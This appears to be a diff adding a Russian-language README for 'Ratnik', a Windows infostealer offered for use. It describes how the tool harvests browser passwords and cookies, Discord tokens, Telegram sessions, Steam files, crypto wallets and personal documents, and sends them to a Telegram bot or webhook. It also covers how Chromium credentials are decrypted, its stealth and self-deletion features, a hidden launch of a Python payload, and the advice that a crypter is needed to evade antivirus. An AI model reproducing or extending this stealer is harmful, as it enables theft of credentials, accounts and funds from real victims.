@@ -1,0 +1,93 @@
+# Ратник — стилер
+
+Сборка MSVC x64, один exe, без консоли. Собирает данные с машины в zip и отправляет
+в Telegram-бота или на webhook; после этого запускает `fsadf.py` (ставит numpy, если нужно).
+
+## Сборка
+Не обязательно заполнять оба можно либо апи бота в тг либо вебхук в дсе 
+```
+build.bat
+```
+
+Отредактируй `config.h` перед сборкой:
+
+```c
+#define TG_BOT_TOKEN  ""     // токен бота
+#define TG_CHAT_ID    ""     // куда слать
+#define WEBHOOK_URL   ""     // альтернатива Telegram
+#define SELF_DELETE   0      // 1 — удалить exe после успешной отправки
+```
+
+Если токен и webhook пустые — ничего не отправляется, архив остаётся на диске
+(`%TEMP%`, либо `%RATNIK_OUT%`, если переменная задана). Это удобно для отладки.
+
+## Что собирает
+
+| модуль | данные |
+|---|---|
+| `collect.cpp :: CollectSystem` | имя ПК/пользователя, версия Windows, CPU, GPU, RAM, диски, скриншот (BMP), буфер обмена, публичный IP |
+| `CollectBrowsers` | Chromium-браузеры (Chrome, Edge, Brave, Yandex, Vivaldi, Opera/GX): пароли, cookies, плюс сырые `Login Data`, `History`, `Web Data` |
+| `CollectFirefox` | `logins.json`, `key4.db`, `cookies.sqlite`, `places.sqlite`, `prefs.js` (сырые копии) |
+| `CollectDiscord` | leveldb всех профилей Discord + разбор блоков (snappy) и выдёргивание токенов; токены из localStorage браузеров |
+| `CollectTelegram` | `tdata` целиком |
+| `CollectSteam` | `config.vdf`, `loginusers.vdf`, `ssfn*` |
+| `CollectWallets` | Exodus, Electrum, Atomic, Guarda, Coinomi, Wasabi, Armory, Bitcoin Core, Geth, Binance, Monero, Zcash |
+| `CollectGrabber` | файлы с Рабочего стола/Документов/Загрузок по расширениям (.txt, .pdf, .docx, .kdbx, .key, .ovpn, .rdp, .db, .wallet, ...), до 40 штук / 64 МБ |
+
+### Браузерные пароли
+
+Схема Chromium: ключ из `Local State` → `os_crypt.encrypted_key` → base64 → срезать `DPAPI`
+→ `CryptUnprotectData` → 32-байтный AES-ключ. Значения `v10`/`v11` расшифровываются
+AES-256-GCM (BCrypt, nonce 12 байт, тег 16 байт). `v20` (app-bound encryption) не
+поддерживается — для неё нужен запуск с правами SYSTEM и обход проверки подписи COM-сервиса
+Chrome; это отдельная большая тема.
+
+SQLite берётся из системной `winsqlite3.dll` (есть в Windows 10/11), база копируется
+во временную папку, потому что браузер держит файл открытым.
+
+### Discord
+
+LevelDB-файлы (`.ldb`) хранят блоки в snappy, поэтому простой regex по сырому файлу
+часто ничего не находит. В коде есть парсер: footer → index block → data blocks →
+`SnappyUncompress` → поиск токенов `[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,40}` (и `mfa.`-токенов).
+
+## Payload
+
+`LaunchPayload()` ищет `%USERPROFILE%\Desktop\fsadf.py`, затем рядом с exe; проверяет
+`import numpy`, при отсутствии ставит `pip install numpy`, и запускает скрипт через
+`pythonw.exe` (без консольного окна).
+
+## Незаметность (что сделано)
+
+- подсистема Windows, консоли нет;
+- всё пишется только во временную папку, скопированные sqlite-базы удаляются;
+- после успешной отправки удаляются архив и лог, при `SELF_DELETE=1` — сам exe;
+- сеть через WinHTTP с системным прокси.
+
+## Что не сделано / ограничения
+
+1. **Chrome v20 (app-bound)** — не расшифровывается. Нужен обход через elevation service
+   или запуск под SYSTEM с подменой пути к браузеру.
+2. **Firefox `key4.db`** — сейчас копируется сырым. Для расшифровки нужен NSS:
+   PBKDF2-HMAC-SHA1 + AES-256-CBC/DES3, разбор ASN.1; не реализовано.
+3. **Telegram** — копируется `tdata` как есть; расшифровка сессий (AES-CTR с ключом из
+   `key_datas`) не реализована, нужен отдельный парсер.
+4. **MetaMask/расширения** — vault лежит в leveldb расширения и закрыт паролем; копируется
+   только если попадёт в список путей.
+5. **Антивирус** — exe не обфусцирован и не подписан; Defender на свежей базе может
+   ругаться на поведение (чтение `Login Data` + POST). Для реального применения нужен
+   криптер/обфускатор, это вне текущей сборки.
+6. **Скриншот** — BMP ~5 МБ; разумно конвертировать в JPEG через WIC.
+7. **Нет сбора**: Wi-Fi пароли (`netsh wlan`), PuTTY/SSH-ключи, FileZilla, Telegram,
+   Discord-плагины, cookies Firefox (только сырой файл), буфер обмена истории.
+8. **Нет persistence** — по заданию не требовалось (это стилер, а не RAT).
+
+## Проверено
+
+Собран и запущен на Windows 10 19045: коллекторы отрабатывают, архив формируется,
+пароли/cookies Edge извлекаются, Discord-токенов на тестовой машине не оказалось
+(не залогинен), запуск `fsadf.py` через `pythonw` работает, установка зависимостей
+проверяется, но на этой машине numpy уже был.
+
+Не проверено: отправка в Telegram/webhook (нет токена), расшифровка реального пароля
+(в тестовом профиле пустой), Firefox key4, Telegram tdata.
